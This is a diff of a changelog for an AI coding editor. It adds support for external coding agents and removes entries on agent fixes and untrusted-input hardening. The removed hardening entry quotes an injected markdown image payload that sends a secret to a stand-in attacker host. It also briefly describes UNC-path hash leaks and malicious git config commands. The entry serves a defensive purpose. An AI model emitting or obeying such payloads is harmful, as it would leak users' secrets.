@@ -1,5 +1,15 @@
 # Changelog
 
+## Unreleased - Coding agents you already have an account with
+
+- **Settings > Models > Coding Agents** (`docs/integrations/external-agents.md`): use the subscription or free tier you already have with Codex, Cursor,
+  OpenCode and Gemini CLI inside Vader's chat (Agent Client Protocol; the vendor's own program does the work and the sign-in, Vader never sees a
+  token), and open Claude Code, Antigravity and Freebuff in a Vader terminal exactly as the vendor ships them (Anthropic allows its subscription only in
+  its own unmodified program). One card per agent with its logo; install/download actions show what they will run; add any other ACP program by hand;
+  pick the agent in the chat box and switch back to your models at any time. The agent keeps its own tools and permission rules: its permission questions
+  are shown in Vader, Vader's policy engine does not apply to it (stated on the cards). Tested against a stand-in agent that speaks the real wire
+  (`externalAgentE2E`, 51 checks) and through the real UI (`external-agents` group).
+
 ## Unreleased - Settings page sections, update check, inherited-leftover cleanup
 
 - **Settings page, same look, more of it.** The sidebar is grouped (Models / Agent / Workspace) and gained: *Agent & Permissions* (default chat mode,
@@ -8,25 +18,6 @@
   The old "Metrics" opt-out switch (it controlled nothing) is gone.
 - **Update check that works.** The inherited updater needs an update server Vader does not have. "Check for Updates" now compares the running version with
   the latest GitHub release and offers the download page; a background check exists but is off by default.
-- **Agent no longer stops silently on a differently-written tool call.** A real model wrote `<run_command command="...">` (parameters as attributes)
-  and the XML tool parser, which only knew `<run_command><command>...</command></run_command>`, treated it as plain text: nothing ran and the
-  agent ended its turn. The parser now accepts attribute and self-closing forms and Hermes/Qwen `<tool_call>{"name": ...}</tool_call>` JSON calls, and the
-  prompt says parameters are nested tags. Covered by the parser test and a real-app scenario.
-- **Everyday agent problems found by probing the real app with a scripted model** (each now has a test):
-  - *Relative paths* (`src/app.js`, `./notes.txt`, `.`) were turned into paths at the root of the disk: files "did not exist", `ls_dir .` listed `/`, and a
-    file created with a relative path landed outside the project. They now resolve against the open folder (`~` too); with no folder open the model is
-    told to use an absolute path. Terminal `cwd` follows the same rule.
-  - *Shell syntax:* the prompt now says which shell the terminal is (PowerShell on Windows, so no `&&` / `ver`), the cause of many failed commands.
-  - *Errors in plain words:* provider failures show one sentence about what to do (bad key, rate limit, model not found, no connection, context too
-    long...) instead of `[UNKNOWN] ...`; an empty model reply is explained instead of ending silently.
-  - *Edits right after a file changed on disk* could not be saved ("file modified since"); an unmodified open file is re-read first.
-  - Tool arguments sent as strings or `null`, `file://` URLs, CRLF files and an edit whose ORIGINAL text is missing are covered by tests.
-- **Untrusted-input hardening** (found by looking for the unexpected route, written up in `docs/integrations/untrusted-input.md`, each with a test):
-  chat markdown no longer fetches web images by itself (an injected `![](https://attacker/?d=SECRET)` could leak data) and only follows http/https/mailto
-  links; file tools refuse `\\host\share`, `//host/share` and `file://host/...` (Windows would send the login hash); every git call Vader makes by itself ignores
-  programs named in a repository's `.git/config` (a prepared folder could run a command on the first `git diff`) and its hooks; Export Settings no longer
-  writes API keys, and Import Settings never moves a key to a different endpoint; a tool request restored from disk or an imported chat is checked against
-  the hard policy again before it runs; the unused Tunnel Forwarding extension (needs Microsoft's tunnel service and a CLI Vader does not ship) is gone.
 - **Inherited leftovers removed:** the two bundled Remote-SSH / Remote-WSL extensions (they could not work with Microsoft's remote server), the
   "Use AI Features with Copilot for free..." palette command, the Accounts icon (starts hidden; Microsoft/GitHub sign-in only), and a crash in
   *One-Click Switch* when the source editor had no extensions folder.
